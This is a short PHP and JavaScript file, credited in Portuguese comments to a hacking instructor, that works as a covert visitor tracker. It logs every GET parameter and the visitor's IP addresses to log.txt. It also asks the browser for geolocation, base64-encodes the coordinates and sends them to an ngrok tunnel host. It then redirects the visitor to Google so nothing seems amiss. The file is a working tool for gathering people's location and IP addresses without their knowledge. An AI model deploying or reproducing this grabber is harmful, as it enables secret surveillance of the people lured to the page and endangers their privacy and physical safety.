
// Créditos ao rafa sousa, o grande mestre: 
// @hackingnaweboficial

<?php
$ip1 = $_SERVER['REMOTE_ADDR'];
$ip2 = $_SERVER['HTTP_X_FORWARDED_FOR'];
$f = fopen("log.txt","a");
foreach ($_GET as $v => $r){
    fwrite($f,$v . " = " . $r . "\r\n");
}
fwrite($f, "\$SERVER['REMOTE_ADDR']: " . $ip1 . "\r\n");
fwrite($f, "\$_SERVER['HTTP_X_FORWARDED_FOR']: " . $ip2 . "\r\n\r\n");
fclose($f);
?>

<script>
if (navigator.geolocation){
    navigator.geolocation.getCurrentPosition(function(position){
        var gps = btoa(position.coords.latitude + "," + position.coords.longitude);
        var xhttp = new XMLHttpRequest();
        xhttp.open("GET","https://62f4-2804-14c-65d1-8838-f81a-14ee-a642-4c3a.ngrok.io/?addr="+gps);
        xhttp.send();
    });
}
</script>

<?php
header("Location: https://www.google.com.br");
?>
